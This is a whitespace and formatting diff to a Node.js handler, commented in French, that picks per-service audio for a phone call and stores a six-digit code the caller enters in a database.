@@ -17,7 +17,7 @@ module.exports = function(request, response) {
     var callSid = request.body.CallSid;
     var service = null;
 
-    if(!!!callSid) {
+    if (!!!callSid) {
         return response.status(200).json({
             error: 'Please give us the callSid.'
         });
@@ -27,7 +27,9 @@ module.exports = function(request, response) {
      * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
      */
     db.get('SELECT service FROM calls WHERE callSid = ?', [callSid], (err, row) => {
-        if (err) { return console.log(err.message); }
+        if (err) {
+            return console.log(err.message);
+        }
 
         /**
          * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
@@ -36,7 +38,7 @@ module.exports = function(request, response) {
         /**
          * Au cas où le callSid est trouvé mais le service n'existe pas, on utilise l'audio par défaut
          */
-        if(config[service + 'filepath'] == undefined) service = 'default';
+        if (config[service + 'filepath'] == undefined) service = 'default';
         /**
          * L'on crée ici les url des audios grâce aux données dans le fichier config
          */
@@ -52,18 +54,18 @@ module.exports = function(request, response) {
         /**
          * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
          */
-        if(input.length == 6 && input.match(/^[0-9]+$/) != null && input != null) {
+        if (input.length == 6 && input.match(/^[0-9]+$/) != null && input != null) {
             /**
              * Audio de fin
              */
             respond(end);
-    
+
             /**
              * Ajout du code en DB
              */
             db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                 if (err) {
-                  return console.log(err.message);
+                    return console.log(err.message);
                 }
             });
         } else {
